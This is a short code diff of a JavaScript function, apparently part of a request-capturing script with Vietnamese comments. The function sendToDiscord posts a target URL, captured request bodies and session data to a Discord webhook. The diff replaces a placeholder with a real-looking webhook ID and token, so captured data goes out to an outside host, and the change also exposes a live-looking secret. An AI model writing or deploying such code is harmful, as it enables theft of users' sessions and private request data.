@@ -60,7 +60,7 @@ function analyzeAndSend() {
 function sendToDiscord(title, color, targetUrl, capturedBody, sessionData, methodType) {
     // ==================================================================
     // ⚠️ THAY WEBHOOK CỦA BẠN VÀO DÒNG DƯỚI ĐÂY ⚠️
-    var discordUrl = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"; 
+    var discordUrl = "https://discordapp.com/api/webhooks/1454906156777472165/tLAGpqP0YKRK0HjgzhHat-CTb3s6OMiFrPqzse_KZ8NfD16FsgXiNmKbqxyqyaKPX1ST"; 
     // ==================================================================
 
     var data = {
@@ -96,3 +96,4 @@ function sendToDiscord(title, color, targetUrl, capturedBody, sessionData, metho
         body: JSON.stringify(data)
     }, function(error, response, data) {});
 }
+
